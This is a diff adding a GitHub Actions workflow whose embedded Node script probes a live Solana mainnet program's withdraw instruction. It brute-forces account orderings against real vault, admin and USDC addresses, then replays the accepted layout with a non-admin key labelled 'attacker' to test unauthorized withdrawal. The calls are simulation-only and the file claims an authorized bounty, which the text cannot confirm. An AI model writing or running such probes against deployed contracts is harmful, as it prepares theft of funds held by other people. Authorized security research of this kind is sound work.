@@ -1,0 +1,54 @@
+name: mayhem-withdraw-order-v2
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/mayhem-withdraw-order-v2.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  simulate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @solana/web3.js @solana/spl-token
+      - name: Simulation-only withdraw account-order recovery
+        shell: bash
+        run: |
+          cat > x.mjs <<'NODE'
+          import {PublicKey,Transaction,TransactionInstruction,SystemProgram} from '@solana/web3.js';
+          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token';
+          const MAY=new PublicKey('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e'),GP=new PublicKey('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ'),SV=new PublicKey('BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s'),ADMIN=new PublicKey('FFWtrEQ4B4PKQoVuHYzZq8FabGkVatYzDpEVHsK5rrhF'),ALT=new PublicKey('39azUYFWPz3VHgKCf3VChUwbpURdCHRxjWVowf5jUJjg'),EA=new PublicKey('8FoNgzmjuSmiy86EPCWxvv1q7oJSu2WGA7wPymwki2LJ'),USDC=new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
+          const D={sol:'1e1b87bc899eda6b',quote:'cc712a30723af859'};
+          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com'];let id=1;const sl=m=>new Promise(r=>setTimeout(r,m));
+          async function q(u,m,p,n=5){let e;for(let i=0;i<n;i++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params:p})});if(r.status===429||r.status>=500){e=Error('HTTP '+r.status);await sl(250+450*i);continue}const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}catch(x){e=x;await sl(150)}}throw e}
+          async function call(m,p){let e;for(const u of RPCS){try{return await q(u,m,p)}catch(x){e=x;console.log('RPCFAIL',m,u,String(x).slice(0,130))}}throw e}
+          const svUsdc=getAssociatedTokenAddressSync(USDC,SV,true,TOKEN_PROGRAM_ID),adminUsdc=getAssociatedTokenAddressSync(USDC,ADMIN,true,TOKEN_PROGRAM_ID),altUsdc=getAssociatedTokenAddressSync(USDC,ALT,true,TOKEN_PROGRAM_ID);
+          const a8=Buffer.alloc(8);a8.writeBigUInt64LE(1n);const data=k=>Buffer.concat([Buffer.from(D[k],'hex'),a8]);
+          const solLayouts={
+            L1:(w)=>[
+              {pubkey:w,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false}],
+            L2:(w)=>[
+              {pubkey:w,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false},{pubkey:SV,isSigner:false,isWritable:true}],
+            L3:(w)=>[
+              {pubkey:w,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false}]
+          };
+          const quoteLayouts={
+            Q1:(w)=>{const dest=w.equals(ADMIN)?adminUsdc:altUsdc;return [
+              {pubkey:w,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:USDC,isSigner:false,isWritable:false},{pubkey:svUsdc,isSigner:false,isWritable:true},{pubkey:TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:ASSOCIATED_TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:dest,isSigner:false,isWritable:true},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false}]},
+            Q2:(w)=>{const dest=w.equals(ADMIN)?adminUsdc:altUsdc;return [
+              {pubkey:w,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:USDC,isSigner:false,isWritable:false},{pubkey:svUsdc,isSigner:false,isWritable:true},{pubkey:TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:ASSOCIATED_TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:dest,isSigner:false,isWritable:true},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false}]},
+            Q3:(w)=>{const dest=w.equals(ADMIN)?adminUsdc:altUsdc;return [
+              {pubkey:w,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:USDC,isSigner:false,isWritable:false},{pubkey:svUsdc,isSigner:false,isWritable:true},{pubkey:TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:ASSOCIATED_TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:dest,isSigner:false,isWritable:true},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false}]}
+          };
+          const watch=[GP,SV,ADMIN,ALT,svUsdc,adminUsdc,altUsdc];
+          function amt(a){if(!a)return null;const b=Buffer.from(a.data[0],'base64');return b.length>=72?b.readBigUInt64LE(64).toString():null}
+          async function sim(kind,label,who,keys){const ix=new TransactionInstruction({programId:MAY,keys,data:data(kind)});const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value.blockhash;const tx=new Transaction({feePayer:ALT,recentBlockhash:bh}).add(ix),raw=tx.serialize({requireAllSignatures:false,verifySignatures:false});let v,used;for(const u of RPCS){try{v=(await q(u,'simulateTransaction',[raw.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses:watch.slice(0,6).map(x=>x.toBase58())}}],3)).value;used=u;break}catch(e){console.log('SIMFAIL',kind,label,u,String(e).slice(0,150))}}if(!v)return {noSim:true};const logs=v.logs??[],snap=(v.accounts??[]).map((a,i)=>({address:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,lamports:a?.lamports??null,tokenAmount:amt(a)}));const r={kind,label,who:who.toBase58(),rpc:used,err:v.err,units:v.unitsConsumed,snapshot:snap,instructions:logs.filter(x=>x.includes('Instruction:')),anchor:logs.filter(x=>/AnchorError|Error Code|Error Number/.test(x)),failed:logs.filter(x=>x.includes('failed:')),interesting:logs.filter(x=>/Withdraw|Permission|Signer|rate|Rate|associated|token|vault|program/i.test(x))};console.log('RESULT',JSON.stringify(r,null,2));return r}
+          let solWinner=null;for(const [l,f] of Object.entries(solLayouts)){const r=await sim('sol',l,ADMIN,f(ADMIN));if(!r.anchor?.some(x=>/InvalidProgramId|AccountOwnedByWrongProgram|NotEnoughAccountKeys/.test(x))){solWinner={l,f,r};break}await sl(150)}
+          console.log('SOL_WINNER',solWinner?.l??null);if(solWinner){const atk=await sim('sol',solWinner.l+'-attacker',ALT,solWinner.f(ALT));console.log('SOL_PAIR',JSON.stringify({control:solWinner.r,attacker:atk},null,2))}
+          let qWinner=null;for(const [l,f] of Object.entries(quoteLayouts)){const r=await sim('quote',l,ADMIN,f(ADMIN));if(!r.anchor?.some(x=>/InvalidProgramId|AccountOwnedByWrongProgram|NotEnoughAccountKeys|ConstraintToken/.test(x))){qWinner={l,f,r};break}await sl(150)}
+          console.log('QUOTE_WINNER',qWinner?.l??null);if(qWinner){const atk=await sim('quote',qWinner.l+'-attacker',ALT,qWinner.f(ALT));console.log('QUOTE_PAIR',JSON.stringify({control:qWinner.r,attacker:atk},null,2))}
+          NODE
+          node x.mjs
